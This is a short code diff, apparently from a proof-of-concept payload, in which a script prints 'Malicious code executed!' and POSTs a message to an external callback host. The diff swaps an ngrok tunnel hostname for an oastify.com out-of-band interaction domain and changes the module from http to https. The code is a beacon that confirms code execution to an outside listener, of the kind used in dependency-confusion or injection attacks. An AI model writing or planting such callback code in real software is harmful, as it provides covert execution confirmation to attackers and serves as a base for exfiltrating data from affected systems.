@@ -2,12 +2,12 @@
 console.log("Malicious code executed!");
 
 // Optionally, send a network request to your server for verification
-const http = require('http');
+const http = require('https');
 
 const data = JSON.stringify({ message: 'Malicious code executed!' });
 
 const options = {
-  hostname: 'c073-37-202-73-127.ngrok-free.app',
+  hostname: 'gtd3h3pd4j6755pp0j6atvb7byhp5otd.oastify.com',
   port: 443,
   path: '/log',
   method: 'POST',
